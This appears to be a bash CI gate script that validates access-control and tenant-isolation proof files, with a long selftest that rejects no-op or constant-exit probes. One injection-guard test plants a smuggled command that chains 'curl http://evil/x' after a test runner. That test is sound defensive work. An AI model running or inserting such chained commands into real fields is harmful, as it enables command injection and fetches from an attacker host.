#!/usr/bin/env bash
# WALTEUR authz-tenant-gate - access-control and tenant-isolation proof.
#
# Contract:
#   - No authz/tenant signal and no ship/reflect requirement             => NOT_APPLICABLE, exit 0.
#   - Authz/tenant signal, ship/reflect, or WALTEUR_AUTHZ_TENANT_REQUIRED=1 without proof => FAIL, exit 2.
#   - Weak/malformed/stale authz/tenant proof                            => FAIL, exit 2.
#   - cross_tenant_probe is a trivial no-op OR a constant-exit wrapper    => FAIL, exit 2.
#   - Complete authz/tenant proof                                        => PASS, exit 0.
#
# HONESTY: HARD. The trivial-probe rejection is a decidable exit-2 check on the probe STRING SHAPE —
# it rejects bare no-op constants (true/false/:/bin/true/...) AND constant-exit wrappers
# (bash -c 'exit N' / sh -c 'true' / bash -c ':' / a bare 'exit N') that prove nothing while passing.
# It does NOT claim an arbitrary command truly exercises the control (undecidable here — that is the
# negative-control discipline's job); it only closes the decidable always-pass loopholes.
#
# Report:
#   walteur-kit/authz-tenant-report.json
#
# Bypass:
#   WALTEUR_AUTHZ_TENANT=off
# --help: self-documentation BEFORE any side effect (S033 usability contract)
case "${1:-}" in
  -h|--help)
  printf '%s\n' "authz-tenant-gate - access-control and tenant-isolation proof."
  printf '%s\n' "usage: bash authz-tenant-gate.sh [--selftest|--help|<default run>]"
  printf '%s\n' "report: walteur-kit/authz-tenant-report.json - fix recipes: walteur-kit/REMEDIATION.md (## authz-tenant-gate)"
  printf '%s\n' "bypass: WALTEUR_AUTHZ_TENANT=off (recorded, not free)"
  exit 0 ;;
esac

set -uo pipefail

# Self-root: resolve this gate's own path so we can source sibling hooks (the shared probe guard).
SELF="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"
# Fail-closed shared guard: the constant-exit / no-op probe CLASS is closed by _probe-proof.sh
# (probe_proves_something). Source it if present; if absent, EXEC mode must FAIL CLOSED (handled below at
# the probe block), never silently skip the unprovable-probe check.
if [ -f "${SELF%/*}/_probe-proof.sh" ]; then . "${SELF%/*}/_probe-proof.sh"; fi

input_dir="${1:-}"
if [ -n "${WALTEUR_ROOT:-}" ] && [ -d "$WALTEUR_ROOT" ]; then
  ROOT="$(cd "$WALTEUR_ROOT" && pwd)"
elif [ -n "$input_dir" ] && [ -d "$input_dir" ]; then
  ROOT="$(cd "$input_dir" && pwd)"
else
  ROOT="$(git rev-parse --show-toplevel 2>/dev/null || pwd)"
fi
ROOT="$(cd "$ROOT" && pwd)"
KIT="$ROOT/walteur-kit"
CONTRACT="$KIT/build-contract.json"
PROOF="$KIT/authz-tenant.json"
STATE="$KIT/autopilot/STATE.json"
REPORT="$KIT/authz-tenant-report.json"
TS="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
MAX_AGE_DAYS="${WALTEUR_AUTHZ_TENANT_MAX_AGE_DAYS:-14}"
mkdir -p "$KIT"

have() { command -v "$1" >/dev/null 2>&1; }

# EXEC default: build-class-aware (S033). When walteur-kit/build-contract.json exists and its build_class
# is a code class (software|data-ai|cloud-iac|mixed), WALTEUR_AUTHZ_TENANT_EXEC defaults to ARMED (1) — a
# tenant surface on a code build must carry a re-runnable cross_tenant_probe by default (shape-only ref
# rejected). No contract, or a non-code class, keeps the legacy default of 0 (probe optional; still re-run
# if present). An explicit WALTEUR_AUTHZ_TENANT_EXEC env value always wins over this default, so
# WALTEUR_AUTHZ_TENANT_EXEC=0 still opts out even on a code-class contract.
default_authz_exec_armed() {
  [ -f "$CONTRACT" ] || return 1
  have jq || return 1
  _tbc="$(jq -r '.build_class // ""' "$CONTRACT" 2>/dev/null)"
  case "$_tbc" in software|data-ai|cloud-iac|mixed) return 0;; *) return 1;; esac
}
if [ -z "${WALTEUR_AUTHZ_TENANT_EXEC:-}" ] && default_authz_exec_armed; then
  WALTEUR_AUTHZ_TENANT_EXEC=1
fi

write_report() {
  local verdict="$1" reason="$2" extra="${3-}"
  [ -n "$extra" ] || extra='{}'
  if have jq && printf '%s\n' "$extra" | jq -e . >/dev/null 2>&1; then
    jq -n --arg v "$verdict" --arg ts "$TS" --arg reason "$reason" --arg proof "${PROOF#"$ROOT"/}" --argjson extra "$extra" \
      '{verdict:$v, ts:$ts, gate:"authz-tenant-gate", proof_file:$proof, reason:$reason} + $extra' > "$REPORT" 2>/dev/null \
      && return 0
  fi
  printf '{"verdict":"%s","ts":"%s","gate":"authz-tenant-gate","proof_file":"%s","reason":"%s"}\n' \
    "$verdict" "$TS" "${PROOF#"$ROOT"/}" "$reason" > "$REPORT" 2>/dev/null || true
}

detect_authz_surface() {
  AUTHZ_SIGNAL=0
  AUTHZ_SIGNAL_REASON=""
  signal_file="${TMPDIR:-/tmp}/authz-tenant-signal.$$"
  : > "$signal_file"
  while IFS= read -r candidate; do
    if grep -Eli '(authz|authorize|authorization|permission|permissions|tenant_id|org_id|workspace_id|rbac|abac|role|roles|policy|session|jwt|oauth|nextauth)' "$candidate" >> "$signal_file" 2>/dev/null; then
      if [ "$(wc -l < "$signal_file" | tr -d ' ')" -ge 1 ]; then
        break
      fi
    fi
  done <<EOF
$(find "$ROOT" \
    \( -path "$ROOT/.git" -o -path "$ROOT/node_modules" -o -path "$ROOT/walteur-kit" -o -path "$ROOT/.venv" \) -prune -o \
    -type f \( -name '*.ts' -o -name '*.tsx' -o -name '*.js' -o -name '*.jsx' -o -name '*.py' -o -name '*.go' -o -name '*.rb' -o -name '*.java' -o -name '*.cs' -o -name '*.sql' -o -name '*.yml' -o -name '*.yaml' \) \
    -print 2>/dev/null | head -n 300)
EOF
  if [ -s "$signal_file" ]; then
    AUTHZ_SIGNAL=1
    AUTHZ_SIGNAL_REASON="$(head -n 1 "$signal_file" | sed "s#^$ROOT/##")"
  fi
  rm -f "$signal_file"
}

detect_required() {
  REQUIRED=0
  REQUIRED_REASON=""

  if [ "${WALTEUR_AUTHZ_TENANT_REQUIRED:-}" = "1" ]; then
    REQUIRED=1
    REQUIRED_REASON="WALTEUR_AUTHZ_TENANT_REQUIRED=1"
    return 0
  fi

  if [ -s "$STATE" ] && have jq && jq empty "$STATE" >/dev/null 2>&1; then
    phase="$(jq -r '.phase // empty' "$STATE" 2>/dev/null || true)"
    case "$phase" in
      ship|reflect)
        REQUIRED=1
        REQUIRED_REASON="STATE.phase=$phase"
        return 0
        ;;
    esac
  fi

  detect_authz_surface
  if [ "$AUTHZ_SIGNAL" -eq 1 ]; then
    REQUIRED=1
    REQUIRED_REASON="authz/tenant signal: $AUTHZ_SIGNAL_REASON"
  fi
}

selftest() {
  local pass=0 fail=0 tmp today self_path
  self_path="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"
  today="$(date -u +%F)"

  ck() {
    local name="$1" want="$2" got="$3"
    if [ "$want" = "$got" ]; then
      echo "  ok   - $name (rc=$got)"
      pass=$((pass+1))
    else
      echo "  FAIL - $name (want $want got $got)"
      fail=$((fail+1))
    fi
  }

  if ! have jq; then
    echo "authz-tenant-gate selftest SKIP - jq not installed."
    return 0
  fi

  write_state() {
    local dst="$1" phase="${2:-ship}"
    mkdir -p "$dst/walteur-kit/autopilot"
    jq -n --arg phase "$phase" '{
      schema_version: 1,
      run_id: "authz-tenant-selftest",
      goal: "AuthZ tenant proof selftest",
      owner: "release-owner",
      build_class: "software",
      risk_tier: "medium",
      phase: $phase,
      autonomy_policy: "full_autopilot",
      budgets: { time_minutes: 1, input_tokens: 1, output_tokens: 1, cost_usd: 0 },
      protected_paths: [],
      stages: [],
      gates: [],
      evidence: [],
      decisions: [],
      signoffs: [],
      authority_boundaries: [],
      blockers: [],
      known_gaps: [],
      next_action: "ship",
      baton_path: "walteur-kit/autopilot/STATE.json",
      updated_at: "2026-06-23T00:00:00Z"
    }' > "$dst/walteur-kit/autopilot/STATE.json"
  }

  write_signal() {
    local dst="$1"
    mkdir -p "$dst/src"
    printf 'export const tenant_id = "t1"; export function authorize(role, permission) { return role === "admin" && permission === "read"; }\n' > "$dst/src/authz.ts"
  }

  write_evidence() {
    local dst="$1"
    mkdir -p "$dst/walteur-kit/authz"
    for f in role-matrix fail-closed least-privilege session token admin audit positive negative anonymous privilege command tenant-key rls cross-tenant isolation signoff evidence; do
      printf '%s evidence\n' "$f" > "$dst/walteur-kit/authz/$f.txt"
    done
  }

  write_good_proof() {
    local dst="$1" run_date="${2:-$today}" tenant_surface="${3:-true}" default_decision="${4:-deny}"
    mkdir -p "$dst/walteur-kit"
    cat > "$dst/walteur-kit/authz-tenant.json" <<JSON
{
  "schema_version": 1,
  "proof_id": "authz-tenant-selftest",
  "run_date": "$run_date",
  "build_class": "software",
  "risk_tier": "medium",
  "verdict": "PASS",
  "applicability": {
    "authn_surface": true,
    "authz_surface": true,
    "tenant_surface": $tenant_surface,
    "external_users": true
  },
  "model": {
    "authn_provider": "OIDC",
    "authz_model": "rbac",
    "default_decision": "$default_decision",
    "tenant_key": "tenant_id"
  },
  "controls": {
    "role_permission_matrix_ref": "walteur-kit/authz/role-matrix.txt",
    "fail_closed_ref": "walteur-kit/authz/fail-closed.txt",
    "least_privilege_ref": "walteur-kit/authz/least-privilege.txt",
    "session_policy_ref": "walteur-kit/authz/session.txt",
    "token_policy_ref": "walteur-kit/authz/token.txt",
    "admin_boundary_ref": "walteur-kit/authz/admin.txt",
    "audit_log_ref": "walteur-kit/authz/audit.txt"
  },
  "tests": {
    "positive_authz_ref": "walteur-kit/authz/positive.txt",
    "negative_authz_ref": "walteur-kit/authz/negative.txt",
    "anonymous_denial_ref": "walteur-kit/authz/anonymous.txt",
    "privilege_escalation_ref": "walteur-kit/authz/privilege.txt",
    "regression_command_ref": "walteur-kit/authz/command.txt"
  },
  "tenant_isolation": {
    "required": $tenant_surface,
    "tenant_key_ref": "walteur-kit/authz/tenant-key.txt",
    "rls_or_policy_ref": "walteur-kit/authz/rls.txt",
    "cross_tenant_denial_ref": "walteur-kit/authz/cross-tenant.txt",
    "isolation_evidence_ref": "walteur-kit/authz/isolation.txt"
  },
  "evidence_refs": ["walteur-kit/authz/evidence.txt"],
  "signoff": {
    "required": true,
    "owner": "security-owner",
    "signoff_ref": "walteur-kit/authz/signoff.txt"
  }
}
JSON
  }

  # set_probe DST CMD EXPECT — rewrites the proof's cross_tenant_probe; CMD passed via --arg so
  # bodies that contain quotes (e.g. bash -c 'exit 0') survive intact (no nested-quote breakage).
  # Defined up here so every probe twin below can use it.
  set_probe() {
    local dst="$1" cmd="$2" expect="${3:-0}"
    jq --arg c "$cmd" --argjson e "$expect" '.tenant_isolation.cross_tenant_probe = {command:$c, expect_exit:$e}' \
      "$dst/walteur-kit/authz-tenant.json" > "$dst/walteur-kit/tmp.json" && mv "$dst/walteur-kit/tmp.json" "$dst/walteur-kit/authz-tenant.json"
  }

  echo "authz-tenant-gate selftest:"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  mkdir -p "$tmp/walteur-kit"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "no signal and no authz-tenant.json -> NOT_APPLICABLE" 0 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  mkdir -p "$tmp/walteur-kit"
  write_signal "$tmp"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "authz signal without authz-tenant.json -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "ship phase without authz-tenant.json -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship
  mkdir -p "$tmp/walteur-kit"
  printf '{not json\n' > "$tmp/walteur-kit/authz-tenant.json"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "invalid authz-tenant.json -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship
  write_evidence "$tmp"
  write_good_proof "$tmp"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "valid authz tenant proof -> PASS" 0 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship
  write_evidence "$tmp"
  write_good_proof "$tmp"
  jq 'del(.controls.role_permission_matrix_ref)' "$tmp/walteur-kit/authz-tenant.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/authz-tenant.json"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "missing role-permission matrix -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship
  write_evidence "$tmp"
  write_good_proof "$tmp" "$today" true allow
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "allow-by-default decision -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship
  write_evidence "$tmp"
  write_good_proof "$tmp"
  jq 'del(.tenant_isolation.cross_tenant_denial_ref)' "$tmp/walteur-kit/authz-tenant.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/authz-tenant.json"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "tenant surface missing cross-tenant denial -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship
  write_evidence "$tmp"
  write_good_proof "$tmp"
  jq '.controls.audit_log_ref = "../outside.txt"' "$tmp/walteur-kit/authz-tenant.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/authz-tenant.json"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "unsafe evidence ref -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship
  write_evidence "$tmp"
  write_good_proof "$tmp" "2000-01-01"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "stale authz tenant proof -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship
  write_evidence "$tmp"
  write_good_proof "$tmp"
  jq '.signoff.required = false' "$tmp/walteur-kit/authz-tenant.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/authz-tenant.json"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "missing required signoff -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship
  write_evidence "$tmp"
  write_good_proof "$tmp"
  : > "$tmp/walteur-kit/authz/negative.txt"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "empty negative-test evidence -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # EXECUTE-PROBE: a tenant surface with a re-runnable cross_tenant_probe that PASSES -> PASS (observed).
  # The probe must reference a REAL on-disk test artifact (shared-guard requirement): seed a passing
  # node --test file and point the probe at it.
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship; write_evidence "$tmp"; write_good_proof "$tmp"
  printf "import { test } from 'node:test'; test('ok', () => {});\n" > "$tmp/walteur-kit/probe.test.mjs"
  set_probe "$tmp" "node --test $tmp/walteur-kit/probe.test.mjs" 0
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "cross_tenant_probe executes + passes -> PASS" 0 "$?"
  jq -e '.cross_tenant_probe_executed != null' "$tmp/walteur-kit/authz-tenant-report.json" >/dev/null 2>&1; ck "report records probe execution" 0 "$?"
  rm -rf "$tmp"

  # EXECUTE-PROBE: probe RUNS a real test that FAILS (exit != 0) -> FAIL (denial did not reproduce).
  # Seed a real node --test file that throws so the guard ACCEPTS the probe (real runner + real file) and
  # the execute-and-observe path is exercised: node exits non-0, != expected 0 -> FAIL.
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship; write_evidence "$tmp"; write_good_proof "$tmp"
  printf "import { test } from 'node:test'; test('boom', () => { throw new Error('x'); });\n" > "$tmp/walteur-kit/fail.test.mjs"
  set_probe "$tmp" "node --test $tmp/walteur-kit/fail.test.mjs" 0
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "cross_tenant_probe executes + FAILS -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # TRIVIAL-PROBE REJECTION (S008 independent-audit fix): command:"true" proves nothing -> FAIL
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship; write_evidence "$tmp"; write_good_proof "$tmp"
  jq '.tenant_isolation.cross_tenant_probe = {command:"true", expect_exit:0}' "$tmp/walteur-kit/authz-tenant.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/authz-tenant.json"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "trivial probe (command:true) -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # CONSTANT-EXIT WRAPPER REJECTION (independent-panel hole): bash -c 'exit 0' proves nothing -> FAIL
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship; write_evidence "$tmp"; write_good_proof "$tmp"
  set_probe "$tmp" "bash -c 'exit 0'" 0
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "constant-exit wrapper (bash -c 'exit 0') -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # CONSTANT-EXIT WRAPPER REJECTION: sh -c 'exit 1' is still a no-op wrapper -> FAIL (even if expect_exit matches)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship; write_evidence "$tmp"; write_good_proof "$tmp"
  set_probe "$tmp" "sh -c 'exit 1'" 1
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "constant-exit wrapper (sh -c 'exit 1') -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # CONSTANT-EXIT WRAPPER REJECTION: bash -c 'true' wraps a trivial constant -> FAIL
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship; write_evidence "$tmp"; write_good_proof "$tmp"
  set_probe "$tmp" "bash -c 'true'" 0
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "constant-exit wrapper (bash -c 'true') -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # CONSTANT-EXIT CLASS CLOSURE (shared guard, EXEC mode) — the per-file regex only blocked the literal
  # `bash -c 'exit 0'`; these previously slipped through. The shared guard rejects the whole class because
  # none of them reference a real test artifact/runner. All must FAIL exit 2 under EXEC mode.
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship; write_evidence "$tmp"; write_good_proof "$tmp"
  set_probe "$tmp" "bash -lc 'exit 0'" 0
  WALTEUR_AUTHZ_TENANT_EXEC=1 WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "EXEC class-closure: bash -lc 'exit 0' -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship; write_evidence "$tmp"; write_good_proof "$tmp"
  set_probe "$tmp" "bash -c 'exit 0;'" 0
  WALTEUR_AUTHZ_TENANT_EXEC=1 WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "EXEC class-closure: bash -c 'exit 0;' -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship; write_evidence "$tmp"; write_good_proof "$tmp"
  set_probe "$tmp" "node -e 'process.exit(0)'" 0
  WALTEUR_AUTHZ_TENANT_EXEC=1 WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "EXEC class-closure: node -e 'process.exit(0)' -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # BACK-COMPAT for the rejection: a REAL provable probe (recognized runner + real on-disk test file) must
  # NOT be rejected and must PASS. node --test names a real artifact, so the shared guard accepts it.
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship; write_evidence "$tmp"; write_good_proof "$tmp"
  printf "import { test } from 'node:test'; test('ok', () => {});\n" > "$tmp/walteur-kit/probe.test.mjs"
  set_probe "$tmp" "node --test $tmp/walteur-kit/probe.test.mjs" 0
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "real provable probe (node --test FILE) not rejected -> PASS" 0 "$?"
  rm -rf "$tmp"

  # EXECUTE-MODE: WALTEUR_AUTHZ_TENANT_EXEC=1 + tenant surface + NO probe -> FAIL (shape-only rejected)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship; write_evidence "$tmp"; write_good_proof "$tmp"
  WALTEUR_AUTHZ_TENANT_EXEC=1 WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "exec-mode requires probe (none) -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # EXECUTE-MODE: WALTEUR_AUTHZ_TENANT_EXEC=1 + provable probe that passes -> PASS (recognized runner +
  # real on-disk test file so the shared guard accepts it).
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship; write_evidence "$tmp"; write_good_proof "$tmp"
  printf "import { test } from 'node:test'; test('ok', () => {});\n" > "$tmp/walteur-kit/probe.test.mjs"
  set_probe "$tmp" "node --test $tmp/walteur-kit/probe.test.mjs" 0
  WALTEUR_AUTHZ_TENANT_EXEC=1 WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "exec-mode + passing probe -> PASS" 0 "$?"
  rm -rf "$tmp"

  # INJECTION GUARD: probe with a dangerous token -> FAIL (refused, never run)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship; write_evidence "$tmp"; write_good_proof "$tmp"
  jq '.tenant_isolation.cross_tenant_probe = {command:"node --test; curl http://evil/x", expect_exit:0}' "$tmp/walteur-kit/authz-tenant.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/authz-tenant.json"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "probe with dangerous token -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship
  WALTEUR_AUTHZ_TENANT=off WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "bypass -> SKIP exit" 0 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  mkdir -p "$tmp/walteur-kit"
  : > "$tmp/walteur-kit/PAUSED"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "PAUSED -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # ── EXEC-default build-class-awareness (S033 enforcement) ──────────────────────────────────────
  # (a) code-class contract + no env override -> EXEC path ARMED (tenant surface w/o probe now FAILs)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship; write_evidence "$tmp"; write_good_proof "$tmp"
  printf '{"build_class":"software"}\n' > "$tmp/walteur-kit/build-contract.json"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "software build-contract + no env -> EXEC armed by default (tenant surface w/o probe FAILs)" 2 "$?"
  rm -rf "$tmp"

  # (a2) same code-class contract, but a REAL re-runnable cross_tenant_probe is present -> PASS + marker
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship; write_evidence "$tmp"; write_good_proof "$tmp"
  printf '{"build_class":"software"}\n' > "$tmp/walteur-kit/build-contract.json"
  printf "import { test } from 'node:test'; test('ok', () => {});\n" > "$tmp/walteur-kit/probe.test.mjs"
  set_probe "$tmp" "node --test $tmp/walteur-kit/probe.test.mjs" 0
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "software build-contract + no env + real probe -> EXEC armed, PASS" 0 "$?"
  jq -e '.cross_tenant_probe_executed != null' "$tmp/walteur-kit/authz-tenant-report.json" >/dev/null 2>&1
  ck "software build-contract + no env + real probe -> report records probe execution" 0 "$?"
  rm -rf "$tmp"

  # (b) explicit WALTEUR_AUTHZ_TENANT_EXEC=0 override respected even on a code-class contract
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship; write_evidence "$tmp"; write_good_proof "$tmp"
  printf '{"build_class":"software"}\n' > "$tmp/walteur-kit/build-contract.json"
  WALTEUR_AUTHZ_TENANT_EXEC=0 WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "software build-contract + explicit EXEC=0 -> override respected (no probe required)" 0 "$?"
  rm -rf "$tmp"

  # (c) no build-contract.json at all -> legacy default (EXEC stays 0, probe optional)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship; write_evidence "$tmp"; write_good_proof "$tmp"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "no build-contract.json -> legacy default (tenant surface w/o probe still PASSes)" 0 "$?"
  rm -rf "$tmp"

  # (d) document build_class contract -> legacy default (EXEC stays 0) even though contract exists
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/authz-tenant-selftest.XXXXXX")" || return 1
  write_state "$tmp" ship; write_evidence "$tmp"; write_good_proof "$tmp"
  printf '{"build_class":"document"}\n' > "$tmp/walteur-kit/build-contract.json"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "document build_class -> legacy default (unaffected by EXEC-default change)" 0 "$?"
  rm -rf "$tmp"

  if [ "$fail" -eq 0 ]; then
    echo "authz-tenant-gate selftest: $pass/$pass passed"
    return 0
  fi
  echo "authz-tenant-gate selftest: $fail failed, $pass passed"
  return 1
}

if [ "${1:-}" = "--selftest" ]; then
  selftest
  exit $?
fi

if [ "${WALTEUR_AUTHZ_TENANT:-}" = "off" ]; then
  write_report "SKIP" "WALTEUR_AUTHZ_TENANT=off"
  exit 0
fi

if [ -f "$KIT/PAUSED" ]; then
  write_report "FAIL" "WALTEUR is paused"
  exit 2
fi

detect_required

if [ ! -s "$PROOF" ]; then
  if [ "$REQUIRED" -eq 1 ]; then
    write_report "FAIL" "authz-tenant.json required: $REQUIRED_REASON"
    exit 2
  fi
  write_report "NOT_APPLICABLE" "authz-tenant.json absent and no authz/tenant signal"
  exit 0
fi

if ! have jq; then
  write_report "FAIL" "jq is required to validate authz-tenant.json"
  exit 2
fi

if ! jq empty "$PROOF" >/dev/null 2>&1; then
  write_report "FAIL" "authz-tenant.json is not valid JSON"
  exit 2
fi

if ! jq -e '
  type == "object"
  and .schema_version == 1
  and (.proof_id | type == "string" and length > 0)
  and (.run_date | type == "string" and test("^[0-9]{4}-[0-9]{2}-[0-9]{2}$"))
  and (.build_class | type == "string" and length > 0)
  and (.risk_tier | type == "string" and length > 0)
  and .verdict == "PASS"
  and (.applicability | type == "object")
  and (.applicability.authn_surface | type == "boolean")
  and (.applicability.authz_surface == true)
  and (.applicability.tenant_surface | type == "boolean")
  and (.applicability.external_users | type == "boolean")
  and (.model | type == "object")
  and (.model.authn_provider | type == "string" and length > 0)
  and (.model.authz_model as $model | ["rbac","abac","pbac","custom"] | index($model))
  and .model.default_decision == "deny"
  and (.model.tenant_key | type == "string" and length > 0)
  and (.controls | type == "object")
  and (.controls.role_permission_matrix_ref | type == "string" and length > 0)
  and (.controls.fail_closed_ref | type == "string" and length > 0)
  and (.controls.least_privilege_ref | type == "string" and length > 0)
  and (.controls.session_policy_ref | type == "string" and length > 0)
  and (.controls.token_policy_ref | type == "string" and length > 0)
  and (.controls.admin_boundary_ref | type == "string" and length > 0)
